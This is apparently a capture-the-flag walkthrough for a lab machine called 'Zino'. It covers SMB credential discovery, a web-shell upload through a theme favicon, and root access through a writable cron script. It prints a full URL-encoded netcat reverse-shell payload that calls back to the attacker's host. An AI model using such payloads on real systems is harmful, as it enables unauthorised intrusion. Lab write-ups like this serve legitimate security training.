Zino

Target IP: 192.168.183.64

Scanning


There are six TCP ports open on the target machine. Looks like the target machine is running a web-application on port 8003. This will be a good place to start enumeration.

Enumeration

Port 8003: HTTP

The webpage above is displayed for this application. The page also contains the software name and version. Doing a Google search shows it is vulnerable to RCE, but the admin username and password is needed. I will try to enumerate further.

Ports 139 and 445: SMB

There is an SMB share called zino open with read-only access. There are some juicy files here.


The file auth.log contains the content above. It looks like a new user has been created. Their login details are peter:chauthok.


The file misc.logcontains another credentials of admin:adminadmin. Time to spray this against the web application login page.

Exploitation


After spraying the login details admin:adminadmin against the web-application login page at 8003, I got access! Now I have the admin login ownership of the application, so I can upload my reverse shell script. Rather than using Metasploit to gain foothold, I wish to exploit this vulnerability manually. The article at this link provides an excellent guide.


Browsing to http://192.168.183.64:8003/booked/Web/admin/manage_theme.php? allows the look of the website to be changed.


I created a one-liner PHP web-shell script and uploaded it. To access my web-shell, I browsed to http://192.168.183.64:8003/booked/Web/custom-favicon.php. I am able to use this web-shell to perform RCE.


Now I have a simple web-shell, time to upgrade it to a reverse shell connection. Trying to gain a reverse shell connection using the exploit above. I notice the target host will only connect to my machine, if my listener was active on port 8003. Now I have a foothold on the machine.

Payload: rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.185%208003%20%3E%2Ftmp%2Ff.
Full URL with payload: http://192.168.183.64:8003/booked/Web/custom-favicon.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.185%208003%20%3E%2Ftmp%2Ff

Privilege Escalation



There is an interesting cronjob. And I have full privileges over this cleanup.py script. Meaning, I can put my reverse shell script inside it.


After trying a few different ports, I found port 21 works. I replaced the content of cleanup.py with the reverse shell as shown above. Then I started a listener on port 21, changed the file permission to be executable, and waited three minutes.


Then I gained a reverse shell connection from the target machine on my port 21. Now I am root.
